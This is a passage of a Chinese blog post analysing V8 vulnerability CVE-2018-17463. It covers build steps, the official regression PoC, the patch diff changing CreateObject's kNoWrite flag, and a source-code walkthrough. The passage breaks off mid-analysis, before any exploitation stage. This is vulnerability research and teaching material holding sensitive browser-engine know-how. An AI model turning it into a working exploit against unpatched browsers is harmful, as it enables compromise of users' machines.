<!DOCTYPE html>


<html lang="zh-CN">
  

    <head>
      <meta charset="utf-8" />
        
      <meta name="description" content="h1J4cker&#39;s Blog" />
      
      <meta
        name="viewport"
        content="width=device-width, initial-scale=1, maximum-scale=1"
      />
      <title>CVE-2018-17463详细分析及复现 |  h1J4cker&#39;s Blog</title>
  <meta name="generator" content="hexo-theme-ayer">
      
      <link rel="shortcut icon" href="/images/h1J4cker.png" />
       
<link rel="stylesheet" href="/dist/main.css">

      
<link rel="stylesheet" href="/css/fonts/remixicon.css">

      
<link rel="stylesheet" href="/css/custom.css">
 
      <script src="https://cdn.staticfile.org/pace/1.2.4/pace.min.js"></script>
       
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-FTH4BWMNR9"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());
  gtag('config', 'G-FTH4BWMNR9');
</script>

 

      <link
        rel="stylesheet"
        href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@5.0.1/bulma.min.css"
      />
      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script>

      <!-- mermaid -->
      
      <style>
        .swal2-styled.swal2-confirm {
          font-size: 1.6rem;
        }
      </style>
    </head>
  </html>
</html>


<body>
  <div id="app">
    
      <canvas class="fireworks"></canvas>
      <style>
        .fireworks {
          position: fixed;
          left: 0;
          top: 0;
          z-index: 99999;
          pointer-events: none;
        }
      </style>
      
      
    <main class="content on">
      <section class="outer">
  <article
  id="post-CVE-2018-17463详细分析及复现"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
  CVE-2018-17463详细分析及复现
</h1>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/posts/f54b4e18/" class="article-date">
  <time datetime="2022-11-20T06:45:43.000Z" itemprop="datePublished">2022-11-20</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/v8/">v8</a>
  </div>
  
<div class="word_count">
    <span class="post-time">
        <span class="post-meta-item-icon">
            <i class="ri-quill-pen-line"></i>
            <span class="post-meta-item-text"> 字数统计:</span>
            <span class="post-count">6.7k</span>
        </span>
    </span>

    <span class="post-time">
        &nbsp; | &nbsp;
        <span class="post-meta-item-icon">
            <i class="ri-book-open-line"></i>
            <span class="post-meta-item-text"> 阅读时长≈</span>
            <span class="post-count">34 分钟</span>
        </span>
    </span>
</div>
 
    </div>
      
    <div class="tocbot"></div>




  
    <div class="article-entry" itemprop="articleBody">
       
  <p>本文章首发于看雪论坛，链接如下：</p>
<p>(<a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-274865.htm">https://bbs.pediy.com/thread-274865.htm</a>)</p>
<ul>
<li><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本文为CVE-2018-17463的分析以及复现，CVE-2018-17463是一个由于TurboFan优化所产生的漏洞，因为我也是刚接触浏览器这方面不久，是个新手，也是第一次复现真实环境中的漏洞，所以我会尽可能的把分析的过程以及自己在复现过程中遇到的问题写清楚，希望能够帮助到和我一样刚入门的师傅。</p>
<p>本文参考文章：<a target="_blank" rel="noopener" href="http://p4nda.top/2019/06/11/%C2%96CVE-2018-17463/?utm_source=tuicool&utm_medium=referral#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA">http://p4nda.top/2019/06/11/%C2%96CVE-2018-17463/?utm_source=tuicool&amp;utm_medium=referral#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA</a></p>
</li>
<li><h1 id="前置准备"><a href="#前置准备" class="headerlink" title="前置准备"></a>前置准备</h1><p>这个漏洞在Chrome Bug的网页上，有很多的相关信息，我们可以在其中找到存在漏洞的版本，可以看到相关的PoC，为我们的复现做准备，这里放一下链接(第一次复现不了解，当时找链接找了半天)：<span id="more"></span></p>
<ul>
<li>漏洞：<a target="_blank" rel="noopener" href="https://bugs.chromium.org/p/chromium/issues/detail?id=888923">这里</a></li>
<li>漏洞详情：<a target="_blank" rel="noopener" href="https://chromium.googlesource.com/v8/v8/+/52a9e67a477bdb67ca893c25c145ef5191976220">这里</a></li>
<li>PoC：<a target="_blank" rel="noopener" href="https://chromium.googlesource.com/v8/v8/+/52a9e67a477bdb67ca893c25c145ef5191976220/test/mjsunit/compiler/regress-888923.js">这里</a></li>
</ul>
<p>基础的V8调试环境的搭建这里就不再赘述了，需要的师傅可以参考我博客里的这一篇文章：<a href="https://survive2.github.io/2022/10/12/v8%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA(Ubuntu22.04)/">v8调试环境搭建</a>，讲的是<code>Ubuntu22.04</code>下的环境搭建。</p>
<p>用如下命令先切换到漏洞所在的版本并编译v8：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git checkout 568979f4d891bafec875fab20f608ff9392f4f29</span><br><span class="line">./tools/dev/v8gen.py x64.debug -vv</span><br><span class="line">ninja -C out.gn/x64.debug</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">如果需要release版本的话，把x64.debug换成x64.release即可，这里为了调试方便，我是用的debug版本</span></span><br></pre></td></tr></table></figure>
</li>
<li><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><ul>
<li><h2 id="PoC分析"><a href="#PoC分析" class="headerlink" title="PoC分析"></a>PoC分析</h2><p>官方给出的PoC如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//poc.js</span></span><br><span class="line">(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">f</span>(<span class="params">o</span>) &#123;</span><br><span class="line">    o.<span class="property">x</span>;</span><br><span class="line">    <span class="title class_">Object</span>.<span class="title function_">create</span>(o);</span><br><span class="line">    <span class="keyword">return</span> o.<span class="property">y</span>.<span class="property">a</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">f</span>(&#123; x : <span class="number">0</span>, y : &#123; a : <span class="number">1</span> &#125; &#125;);</span><br><span class="line">  <span class="title function_">f</span>(&#123; x : <span class="number">0</span>, y : &#123; a : <span class="number">2</span> &#125; &#125;);</span><br><span class="line">  %<span class="title class_">OptimizeFunctionOnNextCall</span>(f);</span><br><span class="line">  <span class="title function_">assertEquals</span>(<span class="number">3</span>, <span class="title function_">f</span>(&#123; x : <span class="number">0</span>, y : &#123; a : <span class="number">3</span> &#125; &#125;));</span><br><span class="line">&#125;)();</span><br><span class="line">(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">f</span>(<span class="params">o</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> a = o.<span class="property">y</span>;</span><br><span class="line">    <span class="title class_">Object</span>.<span class="title function_">create</span>(o);</span><br><span class="line">    <span class="keyword">return</span> o.<span class="property">x</span> + a;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">f</span>(&#123; x : <span class="number">42</span>, y : <span class="number">21</span> &#125;);</span><br><span class="line">  <span class="title function_">f</span>(&#123; x : <span class="number">42</span>, y : <span class="number">21</span> &#125;);</span><br><span class="line">  %<span class="title class_">OptimizeFunctionOnNextCall</span>(f);</span><br><span class="line">  <span class="title function_">assertEquals</span>(<span class="number">63</span>, <span class="title function_">f</span>(&#123; x : <span class="number">42</span>, y : <span class="number">21</span> &#125;));</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>

<p>这里首先创建了一个名为<code>f</code>的函数，其中参数o是一个对象，在函数中调用了<code>Object.Create(o)</code>，并返回<code>o.y.a</code>，<code>Object.create(o)</code>会以其中的参数o为原型，再创建出一个对象并返回，但是这里并没有接收返回值，说明返回的对象并不是重点。接下来调用了两次<code>f</code>函数，然后通过<code>%OptimizeFunctionOnNextCall</code>来触发优化，最后再次调用<code>f</code>函数，并判断返回值是否与<code>3</code>相等。</p>
<p>根据传入的参数可以看出，在<code>f</code>函数并未修改<code>o.y.a</code>的值的情况下，最后一次调用<code>f</code>函数，返回的应该是3，说明这里由于某种原因<code>o.y.a</code>的值被改变了，而在PoC中，只调用了<code>Object.create</code>，那么很明显正是这个函数直接或间接引起了值的改变。</p>
</li>
<li><h2 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h2><p>根据官方给出的补丁：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">@@ <span class="number">-622</span>,<span class="number">7</span> +<span class="number">622</span>,<span class="number">7</span> @@</span><br><span class="line">   <span class="built_in">V</span>(CreateKeyValueArray, Operator::kEliminatable, <span class="number">2</span>, <span class="number">1</span>)                \</span><br><span class="line">   <span class="built_in">V</span>(CreatePromise, Operator::kEliminatable, <span class="number">0</span>, <span class="number">1</span>)                      \</span><br><span class="line">   <span class="built_in">V</span>(CreateTypedArray, Operator::kNoProperties, <span class="number">5</span>, <span class="number">1</span>)                   \</span><br><span class="line">-  <span class="built_in">V</span>(CreateObject, Operator::kNoWrite, <span class="number">1</span>, <span class="number">1</span>)                            \</span><br><span class="line">+  <span class="built_in">V</span>(CreateObject, Operator::kNoProperties, <span class="number">1</span>, <span class="number">1</span>)                       \</span><br><span class="line">   <span class="built_in">V</span>(ObjectIsArray, Operator::kNoProperties, <span class="number">1</span>, <span class="number">1</span>)                      \</span><br><span class="line">   <span class="built_in">V</span>(HasProperty, Operator::kNoProperties, <span class="number">2</span>, <span class="number">1</span>)                        \</span><br><span class="line">   <span class="built_in">V</span>(HasInPrototypeChain, Operator::kNoProperties, <span class="number">2</span>, <span class="number">1</span>)                \</span><br></pre></td></tr></table></figure>

<p>补丁中可以看出，用<code>kNoProperties</code>代替了<code>kNoWrite</code>，那么为了了解<code>kNoWrite</code>是个啥，我们需要在源码中进行查看，在<code>operator.h</code>文件中，我们可以发现<code>kNoWrite</code>定义在一个枚举类型中：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//operator.h  </span></span><br><span class="line"><span class="keyword">enum</span> <span class="title class_">Property</span> &#123;</span><br><span class="line">    kNoProperties = <span class="number">0</span>,</span><br><span class="line">    kCommutative = <span class="number">1</span> &lt;&lt; <span class="number">0</span>,  <span class="comment">// OP(a, b) == OP(b, a) for all inputs.</span></span><br><span class="line">    kAssociative = <span class="number">1</span> &lt;&lt; <span class="number">1</span>,  <span class="comment">// OP(a, OP(b,c)) == OP(OP(a,b), c) for all inputs.</span></span><br><span class="line">    kIdempotent = <span class="number">1</span> &lt;&lt; <span class="number">2</span>,   <span class="comment">// OP(a); OP(a) == OP(a).</span></span><br><span class="line">    kNoRead = <span class="number">1</span> &lt;&lt; <span class="number">3</span>,       <span class="comment">// Has no scheduling dependency on Effects</span></span><br><span class="line">    kNoWrite = <span class="number">1</span> &lt;&lt; <span class="number">4</span>,      <span class="comment">// Does not modify any Effects and thereby</span></span><br><span class="line">                            <span class="comment">// create new scheduling dependencies.</span></span><br><span class="line">    kNoThrow = <span class="number">1</span> &lt;&lt; <span class="number">5</span>,      <span class="comment">// Can never generate an exception.</span></span><br><span class="line">    kNoDeopt = <span class="number">1</span> &lt;&lt; <span class="number">6</span>,      <span class="comment">// Can never generate an eager deoptimization exit.</span></span><br><span class="line">    kFoldable = kNoRead | kNoWrite,</span><br><span class="line">    kKontrol = kNoDeopt | kFoldable | kNoThrow,</span><br><span class="line">    kEliminatable = kNoDeopt | kNoWrite | kNoThrow,</span><br><span class="line">    kPure = kNoDeopt | kNoRead | kNoWrite | kNoThrow | kIdempotent</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>其中<code>kNoWrite</code>的注释的大致意思是：不会产生副作用而创造出一个新的依赖项，根据前面的PoC文件，我们可以看出，简单的调用<code>Object.create()</code>并不会导致值的改变，但当优化之后，值却改变了，再根据补丁文件可以看出<code>CreateObject</code>这个函数被<code>kNoWrite</code>所标记，所以我们可以猜测出<code>CreateObject</code>被认为是不会产生副作用的，为了进一步了解发生了什么，我们需要借助一个工具：<code>Turbolizer</code>。。</p>
<p>通过增加参数来生成<code>Turbolizer</code>所需要的文件：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../../out.gn/x64.debug/d8 poc.js --allow-natives-syntax --trace-turbo</span><br></pre></td></tr></table></figure>

<p>然后运行Turbolizer：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer</span><br></pre></td></tr></table></figure>

<p>将生成的json文件打开就行了，经过观察以后发现，CreateObject节点在generic lowering阶段，变为了Call：</p>
<img src="/posts/f54b4e18/1.png" class="">

<img src="/posts/f54b4e18/2.png" class="">

<p>鼠标放上去就能看见这里用<code>CreateObjectWithoutProporties</code>来代替了原本的<code>JSCreateObject</code>函数，那么我们继续查看源码(由于本人水平有限，源码阅读部分的分析大多是参考的参考文章中的描述)。</p>
</li>
<li><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p>在<code>builtins-object-gen.cc</code>中：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">TF_BUILTIN</span>(CreateObjectWithoutProperties, ObjectBuiltinsAssembler) &#123;</span><br><span class="line">  Node* <span class="type">const</span> prototype = <span class="built_in">Parameter</span>(Descriptor::kPrototypeArg);</span><br><span class="line">  Node* <span class="type">const</span> context = <span class="built_in">Parameter</span>(Descriptor::kContext);</span><br><span class="line">  Node* <span class="type">const</span> native_context = <span class="built_in">LoadNativeContext</span>(context);</span><br><span class="line">  <span class="function">Label <span class="title">call_runtime</span><span class="params">(<span class="keyword">this</span>, Label::kDeferred)</span>, <span class="title">prototype_null</span><span class="params">(<span class="keyword">this</span>)</span>,</span></span><br><span class="line"><span class="function">      <span class="title">prototype_jsreceiver</span><span class="params">(<span class="keyword">this</span>)</span></span>;</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">Comment</span>(<span class="string">&quot;Argument check: prototype&quot;</span>);</span><br><span class="line">    <span class="built_in">GotoIf</span>(<span class="built_in">IsNull</span>(prototype), &amp;prototype_null);</span><br><span class="line">    <span class="built_in">BranchIfJSReceiver</span>(prototype, &amp;prototype_jsreceiver, &amp;call_runtime);</span><br><span class="line">  &#125;</span><br><span class="line">    ..........</span><br><span class="line">  <span class="built_in">BIND</span>(&amp;call_runtime);</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">Comment</span>(<span class="string">&quot;Call Runtime (prototype is not null/jsreceiver)&quot;</span>);</span><br><span class="line">    Node* result = <span class="built_in">CallRuntime</span>(Runtime::kObjectCreate, context, prototype,</span><br><span class="line">                               <span class="built_in">UndefinedConstant</span>());</span><br><span class="line">    <span class="built_in">Return</span>(result);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从源码中可以看出，<code>call_runtime</code>函数实际上又调用了另一个<code>Runtime::kObjecrCreate</code>函数，它的源码在<code>runtime-object.cc</code>中：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">RUNTIME_FUNCTION</span>(Runtime_ObjectCreate) &#123;</span><br><span class="line">  <span class="function">HandleScope <span class="title">scope</span><span class="params">(isolate)</span></span>;</span><br><span class="line">  Handle&lt;Object&gt; prototype = args.<span class="built_in">at</span>(<span class="number">0</span>);</span><br><span class="line">  Handle&lt;Object&gt; properties = args.<span class="built_in">at</span>(<span class="number">1</span>);</span><br><span class="line">  Handle&lt;JSObject&gt; obj;</span><br><span class="line">  <span class="comment">// 1. If Type(O) is neither Object nor Null, throw a TypeError exception.</span></span><br><span class="line">  <span class="keyword">if</span> (!prototype-&gt;<span class="built_in">IsNull</span>(isolate) &amp;&amp; !prototype-&gt;<span class="built_in">IsJSReceiver</span>()) &#123;</span><br><span class="line">    <span class="built_in">THROW_NEW_ERROR_RETURN_FAILURE</span>(</span><br><span class="line">        isolate, <span class="built_in">NewTypeError</span>(MessageTemplate::kProtoObjectOrNull, prototype));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 2. Let obj be ObjectCreate(O).</span></span><br><span class="line">  <span class="built_in">ASSIGN_RETURN_FAILURE_ON_EXCEPTION</span>(</span><br><span class="line">      isolate, obj, JSObject::<span class="built_in">ObjectCreate</span>(isolate, prototype));</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 3. If Properties is not undefined, then</span></span><br><span class="line">  <span class="keyword">if</span> (!properties-&gt;<span class="built_in">IsUndefined</span>(isolate)) &#123;</span><br><span class="line">    <span class="comment">// a. Return ? ObjectDefineProperties(obj, Properties).</span></span><br><span class="line">    <span class="comment">// Define the properties if properties was specified and is not undefined.</span></span><br><span class="line">    <span class="built_in">RETURN_RESULT_OR_FAILURE</span>(</span><br><span class="line">        isolate, JSReceiver::<span class="built_in">DefineProperties</span>(isolate, obj, properties));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 4. Return obj.</span></span><br><span class="line">  <span class="keyword">return</span> *obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到，当O的类型是一个Object或者Null的时候，就会调用<code>JSObject::ObjectCreate</code>，他的位置在源码中的<code>objects.cc</code>：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 9.1.12 ObjectCreate ( proto [ , internalSlotsList ] )</span></span><br><span class="line"><span class="comment">// Notice: This is NOT 19.1.2.2 Object.create ( O, Properties )</span></span><br><span class="line"><span class="function">MaybeHandle&lt;JSObject&gt; <span class="title">JSObject::ObjectCreate</span><span class="params">(Isolate* isolate,</span></span></span><br><span class="line"><span class="params"><span class="function">                                             Handle&lt;Object&gt; prototype)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// Generate the map with the specified &#123;prototype&#125; based on the Object</span></span><br><span class="line">  <span class="comment">// function&#x27;s initial map from the current native context.</span></span><br><span class="line">  <span class="comment">// TODO(bmeurer): Use a dedicated cache for Object.create; think about</span></span><br><span class="line">  <span class="comment">// slack tracking for Object.create.</span></span><br><span class="line">  Handle&lt;Map&gt; map =</span><br><span class="line">      Map::<span class="built_in">GetObjectCreateMap</span>(isolate, Handle&lt;HeapObject&gt;::<span class="built_in">cast</span>(prototype));</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Actually allocate the object.</span></span><br><span class="line">  Handle&lt;JSObject&gt; object;</span><br><span class="line">  <span class="keyword">if</span> (map-&gt;<span class="built_in">is_dictionary_map</span>()) &#123;</span><br><span class="line">    object = isolate-&gt;<span class="built_in">factory</span>()-&gt;<span class="built_in">NewSlowJSObjectFromMap</span>(map);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    object = isolate-&gt;<span class="built_in">factory</span>()-&gt;<span class="built_in">NewJSObjectFromMap</span>(map);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看出，这段代码首先获取了Map，并根据Map的类型来选择调用<code>NewSlowJSObjectFromMap</code>或者<code>NewJSObjectFromMap</code>，我们跟进<code>GetObjectCreateMap</code>函数中继续观察：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Handle&lt;Map&gt; <span class="title">Map::GetObjectCreateMap</span><span class="params">(Isolate* isolate,</span></span></span><br><span class="line"><span class="params"><span class="function">                                    Handle&lt;HeapObject&gt; prototype)</span> </span>&#123;</span><br><span class="line">  <span class="function">Handle&lt;Map&gt; <span class="title">map</span><span class="params">(isolate-&gt;native_context()-&gt;object_function()-&gt;initial_map(),</span></span></span><br><span class="line"><span class="params"><span class="function">                  isolate)</span></span>;</span><br><span class="line">  <span class="keyword">if</span> (map-&gt;<span class="built_in">prototype</span>() == *prototype) <span class="keyword">return</span> map;</span><br><span class="line">  <span class="keyword">if</span> (prototype-&gt;<span class="built_in">IsNull</span>(isolate)) &#123;</span><br><span class="line">    <span class="keyword">return</span> isolate-&gt;<span class="built_in">slow_object_with_null_prototype_map</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (prototype-&gt;<span class="built_in">IsJSObject</span>()) &#123;</span><br><span class="line">    Handle&lt;JSObject&gt; js_prototype = Handle&lt;JSObject&gt;::<span class="built_in">cast</span>(prototype);</span><br><span class="line">    <span class="keyword">if</span> (!js_prototype-&gt;<span class="built_in">map</span>()-&gt;<span class="built_in">is_prototype_map</span>()) &#123;</span><br><span class="line">      JSObject::<span class="built_in">OptimizeAsPrototype</span>(js_prototype);</span><br><span class="line">    &#125;</span><br><span class="line">    Handle&lt;PrototypeInfo&gt; info =</span><br><span class="line">        Map::<span class="built_in">GetOrCreatePrototypeInfo</span>(js_prototype, isolate);</span><br><span class="line">    <span class="comment">// TODO(verwaest): Use inobject slack tracking for this map.</span></span><br><span class="line">    <span class="keyword">if</span> (info-&gt;<span class="built_in">HasObjectCreateMap</span>()) &#123;</span><br><span class="line">      map = <span class="built_in">handle</span>(info-&gt;<span class="built_in">ObjectCreateMap</span>(), isolate);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      map = Map::<span class="built_in">CopyInitialMap</span>(isolate, map);</span><br><span class="line">      Map::<span class="built_in">SetPrototype</span>(isolate, map, prototype);</span><br><span class="line">      PrototypeInfo::<span class="built_in">SetObjectCreateMap</span>(info, map);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> map;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> Map::<span class="built_in">TransitionToPrototype</span>(isolate, map, prototype);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里如果满足<code>prototype-&gt;IsJSObject()</code>并且如果<code>!js_prototype-&gt;map()-&gt;is_prototype_map()</code>，那么将会调用优化函数<code>JSObject::OptimizeAsPrototype</code>来进行优化，我们继续跟进源码看：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">JSObject::OptimizeAsPrototype</span><span class="params">(Handle&lt;JSObject&gt; object,</span></span></span><br><span class="line"><span class="params"><span class="function">                                   <span class="type">bool</span> enable_setup_mode)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (object-&gt;<span class="built_in">IsJSGlobalObject</span>()) <span class="keyword">return</span>;</span><br><span class="line">  <span class="keyword">if</span> (enable_setup_mode &amp;&amp; <span class="built_in">PrototypeBenefitsFromNormalization</span>(object)) &#123;</span><br><span class="line">    <span class="comment">// First normalize to ensure all JSFunctions are DATA_CONSTANT.</span></span><br><span class="line">    JSObject::<span class="built_in">NormalizeProperties</span>(object, KEEP_INOBJECT_PROPERTIES, <span class="number">0</span>,</span><br><span class="line">                                  <span class="string">&quot;NormalizeAsPrototype&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (object-&gt;<span class="built_in">map</span>()-&gt;<span class="built_in">is_prototype_map</span>()) &#123;</span><br><span class="line">    <span class="keyword">if</span> (object-&gt;<span class="built_in">map</span>()-&gt;<span class="built_in">should_be_fast_prototype_map</span>() &amp;&amp;</span><br><span class="line">        !object-&gt;<span class="built_in">HasFastProperties</span>()) &#123;</span><br><span class="line">      JSObject::<span class="built_in">MigrateSlowToFast</span>(object, <span class="number">0</span>, <span class="string">&quot;OptimizeAsPrototype&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    Handle&lt;Map&gt; new_map = Map::<span class="built_in">Copy</span>(object-&gt;<span class="built_in">GetIsolate</span>(),</span><br><span class="line">                                    <span class="built_in">handle</span>(object-&gt;<span class="built_in">map</span>(), object-&gt;<span class="built_in">GetIsolate</span>()),</span><br><span class="line">                                    <span class="string">&quot;CopyAsPrototype&quot;</span>);</span><br><span class="line">    JSObject::<span class="built_in">MigrateToMap</span>(object, new_map);</span><br><span class="line">    object-&gt;<span class="built_in">map</span>()-&gt;<span class="built_in">set_is_prototype_map</span>(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Replace the pointer to the exact constructor with the Object function</span></span><br><span class="line">    <span class="comment">// from the same context if undetectable from JS. This is to avoid keeping</span></span><br><span class="line">    <span class="comment">// memory alive unnecessarily.</span></span><br><span class="line">    Object* maybe_constructor = object-&gt;<span class="built_in">map</span>()-&gt;<span class="built_in">GetConstructor</span>();</span><br><span class="line">    <span class="keyword">if</span> (maybe_constructor-&gt;<span class="built_in">IsJSFunction</span>()) &#123;</span><br><span class="line">      JSFunction* constructor = JSFunction::<span class="built_in">cast</span>(maybe_constructor);</span><br><span class="line">      <span class="keyword">if</span> (!constructor-&gt;<span class="built_in">shared</span>()-&gt;<span class="built_in">IsApiFunction</span>()) &#123;</span><br><span class="line">        Context* context = constructor-&gt;<span class="built_in">context</span>()-&gt;<span class="built_in">native_context</span>();</span><br><span class="line">        JSFunction* object_function = context-&gt;<span class="built_in">object_function</span>();</span><br><span class="line">        object-&gt;<span class="built_in">map</span>()-&gt;<span class="built_in">SetConstructor</span>(object_function);</span><br><span class="line">      &#125;</span><br><span class="line">    